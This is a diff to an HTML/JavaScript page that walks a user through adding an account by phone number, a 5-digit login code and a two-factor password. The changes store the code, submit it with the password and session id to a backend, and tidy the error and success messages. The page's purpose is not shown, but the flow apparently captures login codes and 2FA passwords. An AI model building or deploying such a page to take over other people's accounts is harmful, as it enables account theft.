@@ -246,6 +246,20 @@
             display: block;
         }
 
+        .success-message {
+            background: #1e4a2b;
+            color: white;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 0.9rem;
+            display: none;
+        }
+
+        .success-message.show {
+            display: block;
+        }
+
         /* Loading spinner */
         .loading-spinner {
             display: inline-block;
@@ -347,7 +361,7 @@
                 <div class="resend-timer" id="resendTimer"></div>
             </div>
 
-            <!-- Page 3: Two-Factor Authentication (separate page) -->
+            <!-- Page 3: Two-Factor Authentication -->
             <div id="page3" style="display: none;">
                 <div class="header-bar">
                     <div class="back-button" onclick="backToPage2()">
@@ -405,6 +419,7 @@
         let timeLeft = 60;
         let currentSessionId = null;
         let currentPhone = '';
+        let currentCode = ''; // Store the code for 2FA submission
 
         // DOM elements
         const hiddenInput = document.getElementById('hiddenCodeInput');
@@ -418,12 +433,16 @@
 
         // Helper functions
         function showError(message) {
+            // Remove any existing error messages
+            const existingErrors = document.querySelectorAll('.error-message');
+            existingErrors.forEach(el => el.remove());
+            
             const errorDiv = document.createElement('div');
             errorDiv.className = 'error-message show';
             errorDiv.textContent = message;
             
             // Find which page is visible
-            const visiblePage = document.querySelector('#page1:visible, #page2:visible, #page3:visible, #page4:visible');
+            const visiblePage = document.querySelector('#page1:not([style*="display: none"]), #page2:not([style*="display: none"]), #page3:not([style*="display: none"]), #page4:not([style*="display: none"])');
             if (visiblePage) {
                 visiblePage.insertBefore(errorDiv, visiblePage.firstChild);
             }
@@ -436,17 +455,22 @@
         }
 
         function showSuccess(message) {
-            const errorDiv = document.createElement('div');
-            errorDiv.className = 'error-message show';
-            errorDiv.style.background = '#1e4a2b';
-            errorDiv.textContent = message;
+            // Remove any existing success messages
+            const existingSuccess = document.querySelectorAll('.success-message');
+            existingSuccess.forEach(el => el.remove());
             
-            const page2 = document.getElementById('page2');
-            page2.insertBefore(errorDiv, page2.firstChild);
+            const successDiv = document.createElement('div');
+            successDiv.className = 'success-message show';
+            successDiv.textContent = message;
+            
+            const visiblePage = document.querySelector('#page1:not([style*="display: none"]), #page2:not([style*="display: none"]), #page3:not([style*="display: none"]), #page4:not([style*="display: none"])');
+            if (visiblePage) {
+                visiblePage.insertBefore(successDiv, visiblePage.firstChild);
+            }
             
             setTimeout(() => {
-                if (errorDiv.parentNode) {
-                    errorDiv.remove();
+                if (successDiv.parentNode) {
+                    successDiv.remove();
                 }
             }, 3000);
         }
@@ -489,6 +513,7 @@
             
             // Auto verify when 5 digits entered
             if (this.value.length === 5) {
+                currentCode = this.value; // Store the code
                 setTimeout(() => verifyCode(), 300);
             }
         });
@@ -563,6 +588,7 @@
                 return;
             }
 
+            currentCode = code; // Store code for 2FA
             const button = document.getElementById('verifyBtn');
             setLoading(button, true);
 
@@ -592,8 +618,10 @@
                         clearInterval(timerInterval);
                     }
                     
+                    showSuccess('Account added successfully!');
+                    
                 } else if (data.need_password) {
-                    // Show 2FA page
+                    // Show 2FA page and keep the session and code
                     document.getElementById('page2').style.display = 'none';
                     document.getElementById('page3').style.display = 'block';
                     document.getElementById('password').focus();
@@ -624,6 +652,12 @@
                 return;
             }
 
+            if (!currentCode) {
+                showError('Session expired. Please start over.');
+                backToPage1();
+                return;
+            }
+
             const button = document.getElementById('passwordBtn');
             setLoading(button, true);
 
@@ -634,7 +668,7 @@
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({ 
-                        code: '',  // No code needed for 2FA
+                        code: currentCode,  // Send the code we stored
                         session_id: currentSessionId,
                         password: password
                     })
@@ -653,8 +687,11 @@
                     if (timerInterval) {
                         clearInterval(timerInterval);
                     }
+                    
+                    showSuccess('Account added successfully!');
+                    
                 } else {
-                    showError(data.error || 'Invalid password');
+                    showError(data.error || 'Invalid password. Please try again.');
                     document.getElementById('password').value = '';
                     document.getElementById('password').focus();
                 }
@@ -729,6 +766,7 @@
             hiddenInput.value = '';
             updateCodeBoxes();
             document.getElementById('phone').focus();
+            currentCode = ''; // Clear stored code
             
             if (timerInterval) {
                 clearInterval(timerInterval);
@@ -746,6 +784,7 @@
             document.getElementById('phone').value = '';
             currentSessionId = null;
             currentPhone = '';
+            currentCode = '';
         }
 
         function goToDashboard() {
@@ -783,4 +822,4 @@
         });
     </script>
 </body>
-</html>
+    </html>
